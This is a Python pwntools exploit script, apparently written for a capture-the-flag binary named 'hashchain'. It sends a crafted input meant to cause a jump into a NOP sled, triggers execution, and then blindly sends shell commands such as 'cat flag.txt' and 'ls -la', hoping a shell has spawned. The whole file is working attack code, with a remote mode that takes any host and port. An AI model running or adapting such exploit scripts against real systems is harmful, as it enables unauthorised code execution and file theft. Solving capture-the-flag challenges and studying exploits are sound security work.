from pwn import *

# Set architecture (likely 32-bit x86 based on decompilation using esp)
context.arch = 'i386'

def exploit():
    # Example usage: python3 exploit.py REMOTE HOST=x.x.x.x PORT=1337
    if args.REMOTE:
        if 'HOST' in args and 'PORT' in args:
            r = remote(args.HOST, int(args.PORT))
        else:
            log.error("Please provide HOST and PORT args for remote connection (e.g. HOST=1.2.3.4 PORT=1337)")
            return
    else:
        # Assuming binary is in current directory
        if os.path.exists('./hashchain'):
            r = process('./hashchain')
        else:
            log.error("Binary './hashchain' not found. Use REMOTE mode or place binary in current directory.")
            return

    # Receive welcome
    r.recvuntil(b'> ')

    # Send the magic input that generates a jump to the NOP sled
    # JMP rel32 (0xE9) + 5th byte 0x01
    payload = b'60314'
    r.sendline(payload)
    log.info(f"Sent payload: {payload}")

    # Wait for prompt again
    r.recvuntil(b'> ')

    # Send "doit" to trigger execution
    r.sendline(b'doit')
    log.info("Sent trigger 'doit'")

    # Try to cat flag
    # Try to cat flag
    try:
        # Wait a bit for execution
        time.sleep(1)
        
        # Send commands blindly in case shell is spawned
        r.sendline(b'cat flag.txt')
        r.sendline(b'cat flag')
        r.sendline(b'ls -la')
        
        # Read all output
        response = r.recvall(timeout=5)
        print(f"Received data:\n{response.decode(errors='ignore')}")
    except Exception as e:
        log.error(f"Error: {e}")


if __name__ == '__main__':
    exploit()
